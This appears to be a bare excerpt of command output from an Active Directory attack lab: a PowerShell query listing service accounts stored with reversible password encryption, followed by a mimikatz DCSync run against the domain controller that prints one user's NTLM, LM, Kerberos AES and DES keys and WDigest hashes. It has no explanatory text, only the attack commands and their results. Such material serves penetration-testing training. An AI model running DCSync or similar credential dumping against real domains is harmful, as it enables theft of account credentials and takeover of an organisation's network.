```

PS C:\tools> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl


DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :

DistinguishedName  : CN=syncron,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : syncron
ObjectClass        : user
ObjectGUID         : 36857917-0314-49a3-b09f-40415851ea6d
SamAccountName     : syncron
SID                : S-1-5-21-3842939050-3880317879-2865463114-5617
Surname            :
userAccountControl : 640
UserPrincipalName  :



PS C:\tools>
```

```

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:khartsfield
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'khartsfield' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Kim Hartsfield

** SAM ACCOUNT **

SAM Username         : khartsfield
User Principal Name  : khartsfield@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 10:37:03 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1138
Object Relative ID   : 1138

Credentials:
  Hash NTLM: 4bb3b317845f0954200a6b0acc9b9f9a
    ntlm- 0: 4bb3b317845f0954200a6b0acc9b9f9a
    lm  - 0: 6d57ae87ad6df46fd47e67f5cbbf17ad

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d9e5faae94758121ea0d22bbd03d9640

* Primary:Kerberos-Newer-Keys *
    Default Salt : INLANEFREIGHT.LOCALKHartsfield
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 07519ef64ddac489464c9c74fc497c293f3b354554cddb5e3b10c739271d02ad
      aes128_hmac       (4096) : 705f7b22644d3332f49ab918e7e9fb2a
      des_cbc_md5       (4096) : 4cd53ebf9bb60b8a

* Primary:Kerberos *
    Default Salt : INLANEFREIGHT.LOCALKHartsfield
    Credentials
      des_cbc_md5       : 4cd53ebf9bb60b8a

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  7faba65d6492478825faf673fed8ff18
    02  65b38ff36bdf75291a9610b24487d92e
    03  a7f35da290c088eb8f7c29fefe3263dc
    04  7faba65d6492478825faf673fed8ff18
    05  1bf7aa2953ce8333c758a1e2b30f2aa9
    06  0af339e85ac7280e3fdacea24bd44c5a
    07  f32e780f85a6c02fb30f99a1e08dd590
    08  aee32adf51c0e745406b3fed7016f22c
    09  8edfc6e07f03b34a41ebba729d6e1c4f
    10  d32c3af1aaaa2621f3a678427d1cad4e
    11  aee32adf51c0e745406b3fed7016f22c
    12  7297a161f1c7a17ff158668b47d8717a
    13  b35070028624aab042c947d78c888865
    14  57cbea22cd631e577d80eee9b903f5cf
    15  d4e3dc4d97907d3414b924bbfff8e440
    16  2d485f256fc5e57216d276ab56131f27
    17  69ebbf28ecdb206067e6035eb37f1e1e
    18  e2ac5302f83c64f30b5169b136473b9e
    19  b3b244b7c513748b5eb481056ea304cc
    20  b58405733c54dc79fc5c99cd6b8042c7
    21  fe06c973f2060ee3f0f9388164fefb77
    22  4fb1836d180d03b2226e1b2f69b9517a
    23  35fedabf0a28346c899082f24a29a804
```

